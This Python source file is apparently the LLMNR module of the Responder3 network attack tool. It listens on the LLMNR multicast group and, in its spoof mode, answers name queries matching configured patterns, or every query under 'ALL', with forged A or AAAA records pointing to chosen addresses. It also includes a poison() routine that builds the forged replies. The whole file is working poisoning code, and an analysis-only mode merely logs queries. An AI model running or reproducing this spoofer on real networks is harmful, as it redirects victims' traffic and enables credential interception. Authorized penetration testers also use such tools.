import io
import os
import re
import logging
import traceback
import socket
import struct
import enum
import traceback
import ipaddress

from responder3.newpackets.LLMNR import * 
from responder3.newpackets.DNS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode

class LLMNRSession(ProtocolSession):
	def __init__(self, server):
		ProtocolSession.__init__(self, server)

class LLMNR(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)

	def modulename(self):
		return 'LLMNR'

	def setup(self):
		self.protocol = LLMNRProtocol
		self.spoofTable = []
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
			self.settings = {}
			self.settings['mode'] = PoisonerMode.ANALYSE

		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.settings['mode'] == PoisonerMode.SPOOF:
				for exp in self.settings['spoofTable']:
					if exp == 'ALL':
						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
						continue
					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))


	def run(self):
		#need to do some wizardy with the socket setting here
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
		sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		sock.bind(('', self.bind_port))
		mreq = struct.pack("=4sl", self.bind_addr.packed, socket.INADDR_ANY)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

		coro = self.loop.create_datagram_endpoint(
							protocol_factory=lambda: LLMNRProtocol(self),
							sock = sock
		)

		return self.loop.run_until_complete(coro)

	def handle(self, packet, addr, transport, session):
		if 'R3DEEPDEBUG' in os.environ:
				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
		try:
			if self.settings['mode'] == PoisonerMode.ANALYSE:
				for q in packet.Questions:
					self.logPoisonResult(session, requestName = q.QNAME)

			else:
				answers = []
				for targetRE, ip in self.spoofTable:
					for q in packet.Questions:
						if targetRE.match(q.QNAME.name):
							self.logPoisonResult(session, requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
							res = DNSResource()
							if ip.version == 4:
								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
								res.construct(q.QNAME.name, DNSType.A, ip)
							elif ip.version == 6:
								res.construct(q.QNAME.name, DNSType.AAAA, ip) #not tested, but should work
							else:
								raise Exception('This IP version scares me...')
							#res.construct(q.QNAME, NBRType.NB, ip)
							answers.append(res)
				
				response = LLMNRPacket()
				response.construct(  TID = packet.TransactionID, 
									 response = LLMNRResponse.RESPONSE, 
									 answers = answers,
									 questions = packet.Questions
								  )

				transport.sendto(response.toBytes(), addr)
			

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

	
	def poison(self, requestPacket, poisonAddr, poisonName = None):
		self.log(logging.DEBUG,'Poisoning!')
		res = DNSResource()
		res.construct(requestPacket.Questions[0].QNAME.name, DNSType.A, poisonAddr)
		pp = LLMNRPacket()

		pp.construct(TID = requestPacket.TransactionID, 
					 response = LLMNRResponse.RESPONSE, 
					 answers = [res],
					 questions = requestPacket.Questions)

		return pp
		


class LLMNRProtocol(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)
		self._session = LLMNRSession(server.rdnsd)

	def _parsebuff(self, addr):
		packet = LLMNRPacket.from_bytes(self._buffer)
		self._server.handle(packet, addr, self._transport, self._session)
		self._buffer = b''